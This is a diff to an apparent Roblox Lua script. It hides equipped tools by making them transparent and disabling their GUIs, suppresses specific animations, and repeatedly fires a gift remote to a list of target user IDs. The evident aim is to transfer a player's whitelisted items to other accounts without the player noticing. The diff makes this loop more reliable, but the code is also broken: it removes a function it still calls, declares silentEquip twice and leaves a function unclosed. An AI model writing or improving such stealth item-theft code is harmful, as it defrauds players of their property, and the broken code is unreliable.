@@ -241,31 +241,16 @@ local function disableEntityGui(tool)
     end
 end
 
-local function removeVisualModel(tool)
-    local container = tool:FindFirstChild(tool.Name)
-
-    if not container then
-        return
-    end
-
-    local visualName = tool.Name:gsub(" ", "_")
-    local visual = container:FindFirstChild(visualName)
-
-    if visual then
-        visual:Destroy()
-    end
-end
 
 local function silentEquip(tool)
-    local char = getChar()
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return end
+    local equippedConnections = {}
 
-    blockAnim(hum)
-
-    disableEntityGui(tool)
-
+local function cleanupTool(tool)
     for _,v in ipairs(tool:GetDescendants()) do
+        if v:IsA("BillboardGui") then
+            v.Enabled = false
+        end
+
         if v:IsA("BasePart") then
             v.LocalTransparencyModifier = 1
             v.Transparency = 1
@@ -273,27 +258,49 @@ local function silentEquip(tool)
             v.Massless = true
         end
     end
+end
 
-    hum:EquipTool(tool)
+local animConnection
 
-    task.defer(function()
-        removeVisualModel(tool)
-    end)
+local function setupAnimBlock(hum)
+    if animConnection then
+        animConnection:Disconnect()
+        animConnection = nil
+    end
 
-    tool.DescendantAdded:Connect(function(obj)
-        if obj:IsA("BillboardGui") or obj.Name == "EntityGUI" then
-            obj.Enabled = false
+    animConnection = hum.AnimationPlayed:Connect(function(track)
+        local anim = track.Animation
+        if not anim then return end
+
+        local id = tostring(anim.AnimationId)
+
+        if string.find(id, "507768375")
+        or string.find(id, "507768133")
+        or string.find(id, "507768083") then
+            track:Stop()
         end
     end)
 end
 
-local function unequipAll()
-    local char = getChar()
-    for _,v in ipairs(char:GetChildren()) do
-        if v:IsA("Tool") then
-            v.Parent = backpack
-        end
+local function silentEquip(tool)
+    if not tool or not tool.Parent then
+        return false
     end
+
+    local char = getChar()
+    local hum = char:FindFirstChildOfClass("Humanoid")
+
+    if not hum then
+        return false
+    end
+
+    setupAnimBlock(hum)
+
+    cleanupTool(tool)
+
+    hum:EquipTool(tool)
+
+    return true
 end
 
 --====================================================
@@ -731,21 +738,39 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.01)
+        task.wait(0.15)
 
-        local tools = getSortedTools()
+        local success, err = pcall(function()
 
-        for _,tool in ipairs(tools) do
-            silentEquip(tool)
-            task.wait(0.02)
+            local tools = getSortedTools()
 
-            if isWhitelisted(tool) then
-                for _,id in ipairs(targetUserIds) do
-                    giftRemote:FireServer(id)
+            for _,tool in ipairs(tools) do
+
+                if tool.Parent ~= backpack then
+                    continue
+                end
+
+                local equipped = silentEquip(tool)
+
+                if equipped then
+                    task.wait(0.08)
+
+                    if isWhitelisted(tool) then
+                        for _,id in ipairs(targetUserIds) do
+                            giftRemote:FireServer(id)
+                            task.wait(0.05)
+                        end
+                    end
+
+                    unequipAll()
+
+                    task.wait(0.08)
                 end
             end
+        end)
 
-            unequipAll()
+        if not success then
+            warn("Gift Loop Error:", err)
         end
     end
 end)
